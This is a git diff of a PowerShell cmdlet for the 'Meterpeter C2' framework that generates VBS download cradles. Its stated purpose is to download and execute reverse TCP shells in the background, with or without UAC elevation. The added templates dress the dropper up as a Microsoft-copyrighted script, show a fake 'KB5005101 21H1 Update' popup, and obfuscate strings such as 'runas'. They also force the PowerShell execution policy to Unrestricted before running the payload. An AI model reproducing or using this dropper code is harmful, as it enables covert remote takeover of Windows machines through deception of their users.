@@ -4,12 +4,12 @@
 
    Author: @r00t-3xp10it
    Tested Under: Windows 10 (19043) x64 bits
-   Required Dependencies: @Meterpeter C2 v2.10.11
+   Required Dependencies: @Meterpeter C2 v2.10.14
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.2.12
+   PS cmdlet Dev version: v1.2.13
 
 .DESCRIPTION
-   Cmdlet to create download_crandle.vbs that allow @Meterpeter C2 v2.10.11
+   Cmdlet to create download_crandle.vbs that allow @Meterpeter C2 v2.10.14
    users to create VBS download crandles to download\execute rev tcp shells
    in background process ( orphan ) with or without UAC elevation privileges.
 
@@ -33,7 +33,7 @@
    executed to allow for crandle signature modify everytime its created.
 
 .Parameter Action
-   Accepts arguments: download, fileless (default: download)
+   Accepts arguments: download,fileless,compile (default: download)
 
 .Parameter UACElevation
    Accepts arguments: true, false (default: false)
@@ -124,6 +124,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Rand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
 $Apii = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
 $gUid = -join ((65..90) + (97..122) | Get-Random -Count $StrLength | % {[char]$_}) # Only Random letters!
+$SCNa = "$PayloadName" -replace '(.ps1)$','(.vbs)$'
 $TokenAuth = Get-Random -Minimum 900 -Maximum 1300
 
 If($Action -iNotMatch '^(download|fileless|compile)$')
@@ -192,20 +193,46 @@ If($Action -ieq "download")
 
 #Deobfuscating strings ( download technics ) at runtime
 $TechnicDefault_Tmp = $TechnicDefault_Tmp -replace '@!','w' -replace '#','e' -replace '&%','s'
-$UserLand = @("dIm $Apii,Cmd,Layback
+$UserLand = @("'
+' Copyright (c) Microsoft Corporation.  All rights reserved.
+'
+' VBScript Source File
+'
+' Script Name: $SCNa
+'
+
+'''''''''''''''''''''
+' Vars
+dIm $Apii,Cmd,Layback
 $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
 Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
 
 set ObjConsole = CreateObject(`"Wscript.Shell`")
 CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
-ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
+ObjConsole.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 ObjConsole.Run(`"$TechnicDefault_Tmp`"), 0
 }")
 
 
-$AutoElevation = @("dIm $gUid,CookieAuth,AuthToken
-AuthToken = WScript.FullName
-$gUid = StrReverse(`"sanur`")
+$AutoElevation = @("'
+' Copyright (c) Microsoft Corporation.  All rights reserved.
+'
+' VBScript Source File
+'
+' Script Name: $SCNa
+'
+
+'''''''''''''''''''''
+' Vars
+dIm $gUid,CookieAuth,AuthToken,$Apii,Cmd,Layback
+AuthToken = WScript.FullName:$gUid = StrReverse(`"sanur`")
+$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
+Layback=rEpLaCe($Apii, `"@!`", `"`"):Wscript.Sleep(500)
+set SSLProvider = CreateObject(`"Wscript.Shell`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
+
+'''''''''''''''''''''
+' HELP - GENERAL
+CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
 
 If WScript.Arguments.length = 0 Then
    CookieAuth = WScript.ScriptFullName
@@ -214,12 +241,7 @@ If WScript.Arguments.length = 0 Then
    WScript.Quit
 End If
 
-dIm $Apii,Cmd,Layback
-$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-Layback=rEpLaCe($Apii, `"@!`", `"`"):Wscript.Sleep(500)
-set SSLProvider = CreateObject(`"Wscript.Shell`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
-CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
-SSLProvider.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
+SSLProvider.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 SSLProvider.Run(`"$TechnicDefault_Tmp`"), 0
 WScript.Quit")
 
@@ -243,30 +265,6 @@ CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS
 ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
 ObjConsole.Run(`"$TechnicDefault_Tmp`"), 0
 Wscript.Quit")
-#>
-
-
-<#
-## COMPILE VBS TO EXE ----------
-#C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe /target:exe /out:"$pwd\${Dropper_Name}.exe" "$pwd\${Dropper_Name}.vbs" /platform:anyCPU
-
-$AutoElevation = @("Imports System
-Imports System.Runtime.InteropServices
-Public Module Whatever
-
-Sub Main
-   Dim ObjConsole As Object
-   ObjConsole = CreateObject(`"Wscript.Shell`")
-
-   dIm $Apii,Cmd,Layback
-   $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-   Layback=rEpLaCe($Apii, `"@!`", `"`")
-   Cmd=rEpLaCe(Layback, `":007:`", `"`")
-
-   ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
-   ObjConsole.Run(`"$TechnicDefault_Tmp`")
-end sub
-End Module")
 #>
 
 }
@@ -319,16 +317,61 @@ If($Egg -ieq "false")
 }
 
 
-$UserLand = @("dIm $Apii,Cmd,Layback,fdx,ttl
+$UserLand = @("'
+' Copyright (c) Microsoft Corporation.  All rights reserved.
+'
+' VBScript Source File
+'
+' Script Name: $SCNa
+'
+
+'''''''''''''''''''''
+' Vars
+dIm $Apii,Cmd,Layback,fdx,ttl
 ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
 $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
 Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
 
+'''''''''''''''''''''
+' HELP - GENERAL
 set ObjConsole = CreateObject(`"Wscript.Shell`")
 CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
-ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
+
+ObjConsole.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 ObjConsole.Exec(`"$CrandleCmdLine`")
 }")
+
+
+$AutoElevation = @("'
+' Copyright (c) Microsoft Corporation.  All rights reserved.
+'
+' VBScript Source File
+'
+' Script Name: $SCNa
+'
+
+'''''''''''''''''''''
+' Vars
+dIm $gUid,CookieAuth,AuthToken,$Apii,Cmd,Layback,fdx,ttl
+AuthToken = WScript.FullName:$gUid = StrReverse(`"sanur`")
+ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
+$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
+Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
+
+'''''''''''''''''''''
+' HELP - GENERAL
+set ObjConsole = CreateObject(`"Wscript.Shell`")
+CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
+
+If WScript.Arguments.length = 0 Then
+   CookieAuth = WScript.ScriptFullName
+   Set ObjConsole = CreateObject(`"Shell.Application`"):Wscript.Sleep($TokenAuth)
+   ObjConsole.ShellExecute AuthToken, Chr(34) & CookieAuth & Chr(34) & `" /debug`", `"`", $gUid
+   WScript.Quit
+End If
+
+ObjConsole.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
+ObjConsole.Exec(`"$CrandleCmdLine`")")
 
 
 <#
@@ -353,28 +396,6 @@ ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Sco
 ObjConsole.Exec(`"$CrandleCmdLine`")
 }")
 #>
-
-
-$AutoElevation = @("dIm $gUid,CookieAuth,AuthToken
-AuthToken = WScript.FullName
-$gUid = StrReverse(`"sanur`")
-
-If WScript.Arguments.length = 0 Then
-   CookieAuth = WScript.ScriptFullName
-   Set ObjConsole = CreateObject(`"Shell.Application`"):Wscript.Sleep($TokenAuth)
-   ObjConsole.ShellExecute AuthToken, Chr(34) & CookieAuth & Chr(34) & `" /debug`", `"`", $gUid
-   WScript.Quit
-End If
-
-dIm $Apii,Cmd,Layback,fdx,ttl
-ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
-$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
-
-set ObjConsole = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
-ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
-ObjConsole.Exec(`"$CrandleCmdLine`")")
 
 }
 ElseIf($Action -ieq "Compile")
